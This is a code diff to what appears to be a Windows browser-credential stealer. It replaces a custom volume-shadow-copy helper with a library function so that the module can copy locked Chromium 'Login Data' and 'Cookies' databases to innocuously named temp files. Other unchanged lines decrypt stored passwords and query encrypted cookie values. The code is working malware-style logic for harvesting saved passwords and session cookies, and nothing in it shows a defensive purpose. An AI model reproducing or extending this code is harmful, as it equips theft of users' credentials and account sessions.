@@ -6,7 +6,7 @@ import json
 from win32crypt import CryptUnprotectData
 from manager.logger import Log
 from shutil import copy2
-from vss import ShadowCopy
+from shadowcopy import shadow_copy
 from sqlite3 import connect
 from Crypto.Cipher import AES
 from datetime import datetime, timedelta
@@ -122,16 +122,6 @@ def decrypt_password(buff: bytes, master_key: bytes):
     decrypted_pass = decrypted_pass[:-16].decode()  
     return decrypted_pass
 
-def copy_locked(source_file, destination_file) -> None:
-    drives = set()
-    drives.add("C")
-    sc = ShadowCopy(drives)
-    shadow_path = None
-    try: shadow_path = sc.shadow_path(source_file)  
-    except Exception as e: Log(f"{source_file} copy_locked ---> {e}")
-    copy2(shadow_path or source_file, destination_file)
-    sc.delete()
-
 
 def get_login_data(path, master_key, blink = False):
     try:
@@ -141,7 +131,7 @@ def get_login_data(path, master_key, blink = False):
             profile = path[num+1:]
             logins += f"===============================\n\n\n{profile}:\n\n"
         login_db = join(environ["TEMP"], "lwincache.db")
-        copy_locked(join(path, "Login Data"), login_db)
+        shadow_copy(join(path, "Login Data"), login_db)
         conn = connect(login_db)
         cursor = conn.cursor()
 
@@ -213,7 +203,7 @@ def get_cookies(path, master_key, blink = False):
             cookies += f"===============================\n\n\n{profile}:\n\n"
         if not exists(join(path, "Network", "Cookies")): return None
         cookie_db = join(environ["TEMP"], "cwincache.db")
-        copy_locked(join(path, "Network", "Cookies"), cookie_db)
+        shadow_copy(join(path, "Network", "Cookies"), cookie_db)
         conn = connect(cookie_db)
         cursor = conn.cursor()
         cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies ORDER BY host_key ASC")
